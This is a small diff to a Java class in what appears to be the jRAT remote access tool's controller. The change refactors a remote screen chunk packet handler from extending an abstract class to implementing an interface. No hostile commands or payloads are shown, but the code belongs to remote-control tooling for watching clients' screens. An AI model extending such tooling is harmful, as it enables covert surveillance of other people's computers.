@@ -1,7 +1,7 @@
 package jrat.module.screen.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.module.screen.ui.PanelScreenController;
 
 import javax.imageio.ImageIO;
@@ -13,7 +13,7 @@ import java.io.ByteArrayInputStream;
  * A remote screen partial image
  * Only gets sent to us if it's updated on the client side
  */
-public class PacketRemoteScreenChunk extends AbstractIncomingPacket {
+public class PacketRemoteScreenChunk implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
